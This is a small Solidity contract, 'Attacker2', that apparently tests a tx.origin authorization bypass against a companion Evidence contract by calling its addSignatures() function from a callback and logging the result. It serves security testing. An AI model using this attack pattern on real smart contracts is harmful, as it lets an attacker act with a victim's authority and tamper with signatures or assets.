pragma solidity ^0.4.24;
import "hardhat/console.sol";
import "./Evidence.sol";

interface IEvidence {
    function addSignatures() public returns(bool);
}

contract Attacker2 {
    
    address _evidence;

    constructor(address evidence) {
        _evidence = evidence;
    }

    function callback() public returns (bool){
        console.log(msg.sender);
        bool state = IEvidence(_evidence).addSignatures();
        // test the success of attack using tx.origin
        console.log("state: %s", state);
        return state;
    }

}